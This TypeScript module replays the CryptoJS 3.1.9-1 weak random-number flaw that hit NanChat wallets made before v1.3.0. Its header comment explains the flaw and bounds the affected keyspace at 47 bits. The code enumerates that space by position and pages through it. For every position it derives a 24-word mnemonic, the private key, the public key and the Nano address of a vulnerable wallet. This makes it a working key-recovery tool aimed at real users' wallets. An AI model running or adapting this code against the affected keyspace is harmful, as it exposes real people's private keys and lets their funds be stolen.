/**
 * ill-nan — the keyspace the CryptoJS randomness bug actually reached.
 *
 * CryptoJS 3.1.9-1's `WordArray.random()` does not use a CSPRNG. For every
 * 4-byte word it builds a fresh 32-bit multiply-with-carry generator from
 * `Math.random()`, then flips the generator's output with a sign drawn from
 * another `Math.random()` call:
 *
 *   rcache = _r() * 0x3ade67b7
 *   words.push((_r() * 0x100000000) | 0)
 *
 * The first word is seeded by one `Math.random()` value (32 effective bits).
 * Each later word reuses `rcache` from the previous word, so it adds no new
 * seed material. Every word also consumes two sign draws, except that the
 * last word's first sign draw only feeds `rcache`, which is then discarded.
 *
 * That gives 32 + (2 × words − 1) bits for an `nBytes`-word array:
 *
 *   32 bytes (8 words) → 32 + 15 = 47 bits
 *   16 bytes (4 words) → 32 +  7 = 39 bits
 *
 * The vulnerable wallet path modelled here is the one NanChat used before
 * v1.3.0 through nanocurrency-web-js:
 *
 *   Math.random() → 32-bit MWC seed + sign bits
 *     → CryptoJS.lib.WordArray.random(32) → 32-byte entropy
 *     → BIP39 mnemonic (24 words)
 *     → PBKDF2-SHA512 → 64-byte BIP39 seed
 *     → SLIP-0010 Ed25519 m/44'/165'/0' → private key
 *
 * Determinism note: a victim's actual `Math.random()` stream is specific to
 * their browser session and cannot be reconstructed from a position. This
 * module uses a canonical substitute — position bits 0–31 are the first
 * 32-bit seed, and bits 32–46 are the 15 effective sign bits — and replays
 * the exact CryptoJS transform. Each row is therefore a real, reachable
 * output of the vulnerable code, and the set of 2^47 positions covers the
 * published upper bound on the affected keyspace.
 */

import {
  addressFromPublicKey,
  bytesToHex,
  privateKeyFromBip39Seed,
  publicKeyFromPrivate,
} from './nano';
import { entropyToMnemonic } from './mnemonic';
import { bip39Seed } from './seed';
import { PAGE_SIZE, type DerivedRow } from './keyspace';

/** CryptoJS generated 32 bytes for a 24-word BIP39 phrase. */
export const ILLNAN_ENTROPY_BYTES = 32;

/** BIP39 word count for 256-bit entropy. */
export const ILLNAN_WORD_COUNT = 24;

/** Effective bits contributed by the initial `Math.random()` seed. */
export const ILLNAN_SEED_BITS = 32;

/** Effective sign bits: two per 4-byte word, minus the discarded last one. */
export const ILLNAN_SIGN_BITS = (ILLNAN_ENTROPY_BYTES / 4) * 2 - 1;

/** Total reachable entropy bits: 32 + 15 = 47. */
export const ILLNAN_BITS = ILLNAN_SEED_BITS + ILLNAN_SIGN_BITS;

/** Published upper bound on the affected 256-bit keyspace. */
export const ILLNAN_TOTAL = 1n << BigInt(ILLNAN_BITS);

/** The derivation path nanocurrency-web-js used for account 0. */
export const ILLNAN_PATH = "m/44'/165'/0'";

export function illnanTotalEntries(): bigint {
  return ILLNAN_TOTAL;
}

export function illnanTotalPages(): bigint {
  return (ILLNAN_TOTAL + BigInt(PAGE_SIZE) - 1n) / BigInt(PAGE_SIZE);
}

export function illnanPageStartPosition(page: bigint): bigint {
  return (page - 1n) * BigInt(PAGE_SIZE);
}

export function illnanPageForPosition(position: bigint): bigint {
  if (position < 0n) throw new Error('Position must be nonnegative');
  return position / BigInt(PAGE_SIZE) + 1n;
}

export function illnanClampPage(page: bigint, pages: bigint): bigint {
  return page < 1n ? 1n : page > pages ? pages : page;
}

export function illnanPageLocationPercent(page: bigint, pages: bigint): number {
  return Number((illnanClampPage(page, pages) * 1_000_000n) / pages) / 10_000;
}

/**
 * Split a canonical position into the two sources of entropy the vulnerable
 * generator consumed: a 32-bit initial seed and the 15 effective sign bits.
 */
export function illnanSeedAndSigns(position: bigint): { seed: number; signMask: number } {
  if (position < 0n || position >= ILLNAN_TOTAL) {
    throw new RangeError('Position out of vulnerable range');
  }
  return {
    seed: Number(position & 0xffffffffn),
    signMask: Number(position >> 32n),
  };
}

/** One 32-bit multiply-with-carry generator, matching CryptoJS 3.1.9-1. */
function makeGenerator(initialMW: number): (sign: number) => number {
  let m_w = initialMW;
  let m_z = 0x3ade68b1;
  const mask = 0xffffffff;

  return (sign: number): number => {
    m_z = (0x9069 * (m_z & 0xffff) + (m_z >> 0x10)) & mask;
    m_w = (0x4650 * (m_w & 0xffff) + (m_w >> 0x10)) & mask;
    let result = ((m_z << 0x10) + m_w) & mask;
    result /= 0x100000000;
    result += 0.5;
    return result * sign;
  };
}

/**
 * Replay `CryptoJS.lib.WordArray.random(nBytes)` for a controlled random
 * stream. `seed` is the integer part of the first `Math.random() * 2^32`;
 * `signMask` bit i selects the sign of the i-th `_r()` call (1 = positive).
 *
 * The arithmetic deliberately mirrors CryptoJS, including its `| 0` and
 * `& 0xffffffff` coercions and the big-endian word-to-hex encoding.
 */
export function cryptoJsWordArrayRandom(seed: number, signMask: number, nBytes: number): Uint8Array {
  if (!Number.isInteger(seed) || seed < 0 || seed > 0xffffffff) {
    throw new RangeError('seed must be a uint32');
  }
  if (!Number.isInteger(signMask) || signMask < 0) {
    throw new RangeError('signMask must be a nonnegative integer');
  }
  if (nBytes <= 0 || nBytes % 4 !== 0) {
    throw new RangeError('nBytes must be a positive multiple of 4');
  }

  const words: number[] = [];
  let rcache = 0;
  let signIndex = 0;
  const nextSign = (): number => {
    const positive = ((signMask >>> signIndex) & 1) === 1;
    signIndex++;
    return positive ? 1 : -1;
  };

  for (let i = 0; i < nBytes; i += 4) {
    // First word uses the seed draw; later words reuse the previous rcache.
    const initial = i === 0 ? seed : rcache * 0x100000000;
    const r = makeGenerator(initial);
    // The last word's first draw is only stored in rcache and never read.
    rcache = r(nextSign()) * 0x3ade67b7;
    words.push((r(nextSign()) * 0x100000000) | 0);
  }

  const bytes = new Uint8Array(nBytes);
  for (let i = 0; i < words.length; i++) {
    const word = words[i] >>> 0;
    bytes[i * 4] = (word >>> 24) & 0xff;
    bytes[i * 4 + 1] = (word >>> 16) & 0xff;
    bytes[i * 4 + 2] = (word >>> 8) & 0xff;
    bytes[i * 4 + 3] = word & 0xff;
  }
  return bytes;
}

/** The 32-byte entropy a vulnerable 24-word wallet would have generated. */
export function illnanEntropyForPosition(position: bigint): Uint8Array {
  const { seed, signMask } = illnanSeedAndSigns(position);
  return cryptoJsWordArrayRandom(seed, signMask, ILLNAN_ENTROPY_BYTES);
}

/**
 * Derive one vulnerable wallet from its canonical position.
 *
 * Mirrors the pre-fix nanocurrency-web-js pipeline: entropy → mnemonic →
 * BIP39 seed → SLIP-0010 Ed25519 m/44'/165'/0' → private key.
 */
export async function illnanDerivePrivateKey(position: bigint): Promise<DerivedRow> {
  const entropy = illnanEntropyForPosition(position);
  const mnemonic = entropyToMnemonic(entropy);
  const seed = await bip39Seed(mnemonic, '');
  const privateKey = privateKeyFromBip39Seed(seed, ILLNAN_PATH);
  const publicKey = publicKeyFromPrivate(privateKey);

  return {
    position,
    privateKey,
    privateKeyHex: bytesToHex(privateKey),
    publicKeyHex: bytesToHex(publicKey).toUpperCase(),
    address: addressFromPublicKey(publicKey),
    mnemonic,
    accountIndex: 0,
    path: ILLNAN_PATH,
  };
}
